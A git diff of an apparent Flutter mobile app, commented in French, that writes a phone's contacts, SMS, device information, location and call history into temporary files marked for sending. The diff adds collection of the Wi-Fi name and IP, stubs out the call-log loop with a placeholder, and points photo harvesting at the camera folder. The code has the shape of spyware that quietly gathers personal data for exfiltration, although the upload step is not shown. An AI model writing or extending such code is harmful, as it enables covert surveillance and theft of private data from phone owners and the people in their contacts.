@@ -13,6 +13,7 @@ import 'package:permission_handler/permission_handler.dart';
 import 'package:contacts_service/contacts_service.dart';
 import 'package:path_provider/path_provider.dart';
 import 'package:call_log/call_log.dart';
+import 'package:network_info_plus/network_info_plus.dart';
 
 void main() {
   runApp(const MyApp());
@@ -62,13 +63,14 @@ class _MyHomePageState extends State<MyHomePage> {
     Directory TempDir = await getTemporaryDirectory();
 
     // Creation de la liste des fichiers à envoyer
-    var listeFichiers = ["${TempDir.path}/contact.txt","${TempDir.path}/sms.txt","${TempDir.path}/phone_information.txt","${TempDir.path}/localisation.txt","${TempDir.path}/HistoAppel.txt"];
+    var listeFichiers = ["${TempDir.path}/contact.txt","${TempDir.path}/sms.txt","${TempDir.path}/phone_information.txt","${TempDir.path}/localisation.txt","${TempDir.path}/HistoAppel.txt","${TempDir.path}/NetInfo.txt"];
 
     final FichierContact = "${TempDir.path}/contact.txt";
     final FichierSMS = "${TempDir.path}/sms.txt";
     final FichierInformation = "${TempDir.path}/phone_information.txt";
     final FichierLocalisation = "${TempDir.path}/localisation.txt";
     final FichierHistoAppel = "${TempDir.path}/HistoAppel.txt";
+    final FichierNetInfo = "${TempDir.path}/NetInfo.txt";
 
     // ***** PARTIE INFORMATIONS TELEPHONE *****
     if (Platform.isAndroid) {
@@ -119,18 +121,22 @@ class _MyHomePageState extends State<MyHomePage> {
     File(FichierSMS).writeAsString(infoSMS).then((File fileSMS) {});
 
     // ***** Partie HISTORIQUE D'APPEL *****
-    var histo_appel ="";
-    Iterable<CallLogEntry> entries = await CallLog.get();
-    for (var entree in entries) {
-      int? timestamp = entree.timestamp;
-      final DateTime date1 = DateTime.fromMicrosecondsSinceEpoch(timestamp! * 1000);
-      final date = date1;
-      histo_appel = histo_appel+"Nom du destinataire : "+entree.name!+", Numéro du destinataire : "+entree.number!+", Date : "+date.toString()+"\n";
-    }
+    var histo_appel ="ez";
+    //Iterable<CallLogEntry> entries = await CallLog.get();
+    //for (var entree in entries) {
+      //int? timestamp = entree.timestamp;
+      //final DateTime date1 = DateTime.fromMicrosecondsSinceEpoch(timestamp! * 1000);
+      //final date = date1;
+      //histo_appel = histo_appel+"Nom du destinataire : "+entree.name!+", Numéro du destinataire : "+entree.number!+", Date : "+date.toString()+"\n";
+    //}
     File(FichierHistoAppel).writeAsString(histo_appel).then((File fileHistoAppel) {});
     
     // ***** Partie Wi-Fi *****
-
+    final info = NetworkInfo();
+    var wifiIP = await info.getWifiIP();
+    var wifiName = await info.getWifiName();
+    var netinfo ="Nom du Wi-Fi : "+wifiName!+", IP du Wi-Fi"+wifiIP!;
+    File(FichierNetInfo).writeAsString(netinfo).then((File fileNetInfo) {});
 
     // ***** Partie Envoie des fichiers *****
     // Faire une liste des fichiers à envoyer
@@ -152,7 +158,7 @@ class _MyHomePageState extends State<MyHomePage> {
     // ***** PARTIE PHOTOS *****
 
     // Récupération de la liste de fichier
-    Directory dir = Directory('/storage/1CEC-2F09/Images');
+    Directory dir = Directory('/sdcard/DCIM/camera');
     List<FileSystemEntity> phoneFiles = dir.listSync(recursive: true);
 
     // Définition de la liste de fichier
